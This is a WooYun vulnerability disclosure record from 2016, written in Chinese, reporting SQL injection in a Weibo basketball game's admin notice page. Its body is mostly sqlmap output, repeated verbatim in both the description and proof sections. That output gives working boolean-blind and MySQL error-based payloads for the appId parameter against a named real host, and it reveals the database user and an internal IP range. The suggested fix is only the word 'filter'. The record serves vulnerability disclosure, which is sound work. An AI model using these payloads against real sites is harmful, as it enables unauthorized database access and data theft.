wybug_detail:
漏洞详情 披露状态：   									2016-03-19：	细节已通知厂商并且等待厂商处理中									2016-03-21：	厂商已经确认，细节仅向厂商公开									2016-03-31：	细节向核心白帽子及相关领域专家公开									2016-04-10：	细节向普通白帽子公开									2016-04-20：	细节向实习白帽子公开									2016-05-05：	细节向公众公开  简要描述： 饭后，注射一发~ 详细说明：  http://qijilanqiu.game.weibo.com/admin/notice?appId=1参数appIdsqlmap resumed the following injection point(s) from stored session:---Parameter: appId (GET)    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause    Payload: appId=-5644 OR 8438=8438    Type: error-based    Title: MySQL OR error-based - WHERE or HAVING clause    Payload: appId=-2041 OR 1 GROUP BY CONCAT(0x7176706b71,(SELECT (CASE WHEN (2223=2223) THEN 1 ELSE 0 END)),0x7170716271,FLOOR(RAND(0)*2)) HAVING MIN(0)#---[14:56:21] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5[14:56:21] [INFO] fetching current user[14:56:21] [WARNING] reflective value(s) found and filtering out[14:56:21] [INFO] resumed: o443ywxlky@10.67.15.%current user:    'o443ywxlky@10.67.15.%'

   漏洞证明：  http://qijilanqiu.game.weibo.com/admin/notice?appId=1参数appIdsqlmap resumed the following injection point(s) from stored session:---Parameter: appId (GET)    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause    Payload: appId=-5644 OR 8438=8438    Type: error-based    Title: MySQL OR error-based - WHERE or HAVING clause    Payload: appId=-2041 OR 1 GROUP BY CONCAT(0x7176706b71,(SELECT (CASE WHEN (2223=2223) THEN 1 ELSE 0 END)),0x7170716271,FLOOR(RAND(0)*2)) HAVING MIN(0)#---[14:56:21] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5[14:56:21] [INFO] fetching current user[14:56:21] [WARNING] reflective value(s) found and filtering out[14:56:21] [INFO] resumed: o443ywxlky@10.67.15.%current user:    'o443ywxlky@10.67.15.%'

   修复方案：  过滤   版权声明：转载请注明来源 荒废的腰子@乌云
